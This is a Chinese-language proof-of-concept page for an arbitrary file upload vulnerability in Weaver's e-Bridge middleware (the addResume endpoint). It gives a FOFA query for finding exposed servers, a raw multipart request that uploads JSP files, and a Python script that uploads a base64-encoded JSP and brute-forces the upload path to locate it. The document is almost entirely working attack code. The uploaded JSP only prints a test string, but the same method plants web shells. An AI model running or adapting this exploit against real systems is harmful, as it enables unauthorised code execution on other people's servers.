# 泛微云桥(e-Bridge)系统接口addResume存在任意文件上传漏洞

泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。攻击者可通过任意文件上传漏洞上传文件，获取服务器权限。

## fofa

```yaml
app="泛微-云桥e-Bridge"
```

## poc

```java
POST /wxclient/app/recruit/resume/addResume?fileElementld=111 HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: EBRIDGE_JSESSIONID=6E01926E757A8B0BE87DAA2EACC80EF6
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDOVhr5SwLI1wpry7
Content-Length: 264

------WebKitFormBoundaryDOVhr5SwLI1wpry7
Content-Disposition: form-data; name="file";filename="1.jsp"

1
------WebKitFormBoundaryDOVhr5SwLI1wpry7--
Content-Disposition: form-data; name="file";filename="2.jsp"

1
------WebKitFormBoundaryDOVhr5SwLI1wpry7--
```

![image-20240806141107108](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408061411331.png)

![image-20240806141122909](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408061411965.png)

## 脚本

```python
import string
import random
import sys

import requests
import base64
from datetime import datetime
import itertools
import urllib3


def generate_random_string(length=6):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))


if __name__ == '__main__':
    url = ""
    if len(sys.argv) < 2:
        print("Please Input Like: \r\npython ebridge_upload.py http://192.168.37.169:8088")
        quit()
    else:
        url = sys.argv[1]

    proxies = {"http": "http://127.0.0.1:8080"}
    letters = string.ascii_uppercase
    combinations_two_letters = list(itertools.product(letters, repeat=2))
    combinations_two_letters_strings = [''.join(combo) for combo in combinations_two_letters]
    combinations_single_letter_strings = list(letters)
    all_combinations_strings = combinations_single_letter_strings + combinations_two_letters_strings

    now = datetime.now()
    time = now.strftime("%Y%m")

    data = base64.b64decode("PCVvdXQucHJpbnRsbigiMTIzIik7JT4=").decode()
    r = generate_random_string()
    name = r+".jsp"

    boundary = '----WebKitFormBoundaryDOVhr5SwLI1wpry7'

    body = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="file"; filename=\"{name}\"\r\n'
        'Content-Type: image/png\r\n\r\n'
        f'{data}\r\n'
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="file"; filename="2.jsp"\r\n'
        'Content-Type: image/png\r\n\r\n'
        '1\r\n'
        f'--{boundary}--\r\n'
    )

    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Length': str(len(body))
    }

    header2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    upload_path = "/wxclient/app/recruit/resume/addResume?fileElementld=111"
    response = requests.post(url+upload_path, headers=headers, data=body)
    if response.status_code == 200 and "success" in response.text:

        print("Successful exploitation of vulnerabilities")
        print("Blasting path in progress .....")

        http = urllib3.PoolManager()
        for i in all_combinations_strings:
            path = url+"/upload/{}/{}/{}".format(time, str(i), r+".js%70")
            # print(path)
            if http.request('GET', path, headers=header2).status == 200:
                print("Upload file: {}".format(path))
                break
    else:
        print("Failed to exploit vulnerabilities")
```

## 漏洞来源

- https://mp.weixin.qq.com/s/b8Qsfrg1vnWlyOnuQqCzeg